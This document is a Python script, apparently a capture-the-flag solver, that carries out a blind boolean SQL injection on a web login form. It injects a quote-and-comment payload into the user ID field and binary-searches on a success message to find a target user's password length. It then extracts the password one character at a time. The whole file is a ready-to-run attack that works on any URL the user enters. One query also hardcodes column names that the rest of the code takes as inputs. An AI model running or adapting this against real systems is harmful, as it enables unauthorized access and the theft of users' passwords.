import requests
import sys

from urllib.parse import urljoin


class solver:
	''' Finding userpw's len (in sqli) '''

	# initialazation
	def __init__(self,_url: str,_cn_id: str, _cn_pw: str, _id: str, success_sign: str) -> None:
		self._target_url = _url
		self._login_url = urljoin(self._target_url,"login")
		self._cn_id = _cn_id
		self._cn_pw = _cn_pw
		self._target_id = _id
		self.success_sign = success_sign

	# HTTP methods
	def _login(self, userid : str, userpw : str) -> bool:
		params = {
			self._cn_id:userid,
			self._cn_pw:userpw
		}
		
		response = requests.post(self._login_url,data = params)
		return response

	# sqli methods
	def _sqli(self, query : str) -> requests.Response:
		response = self._login(f"\" or {query}-- ", "dummy")
		return response
	
	# binsearch algorithm
	def _sqli_binsearch(self, _sqli_query: str, low: int, high: int) -> int:
		print("[*] Wait ...")
		while True:
			mid = (low+high)//2

			if low+1 >= high:
				break
			
			query = _sqli_query.format(val=mid)
		
			if self.success_sign in self._sqli(query).text:
				high = mid
			else:
				low = mid

		return mid

	
	# main methods
	def _find_passwd_len(self, user: str, max_userpw_len: int = 100) -> int:
		_sqli_query = f"((SELECT LENGTH(userpassword) WHERE userid = \"{user}\") < {{val}})"
		passwd_len = self._sqli_binsearch(_sqli_query,0,max_userpw_len)
		return passwd_len

	def _find_passwd(self, user: str, passwd_len: int) -> str:

		passwd = ''
		for idx in range(1,passwd_len+1):
			_sqli_query = f"((SELECT substr({self._cn_pw},{idx},1) WHERE {self._cn_id} = \"{self._target_id}\") < CHAR({{val}}))"
			passwd += chr(self._sqli_binsearch(_sqli_query,0x2f,0x7e))
			

		return passwd


	def solve(self):
		result_pw_len = self._find_passwd_len(self._target_id)
		print(f"Now, I get password len : {result_pw_len}")

		result_pw = self._find_passwd(self._target_id,result_pw_len)
		print(f"Finally, I get user's password : {result_pw}")


if __name__ == "__main__":
	_url = input("Input target URL: ")
	_cn_id = input("Input name of id's column: ")
	_cn_pw = input("Input name of pw's column: ")
	_id = input("Input target id: ")
	success_sign = input("Input text of successful login: ")
	sol = solver(_url,_cn_id,_cn_pw,_id,success_sign)
	sol.solve()


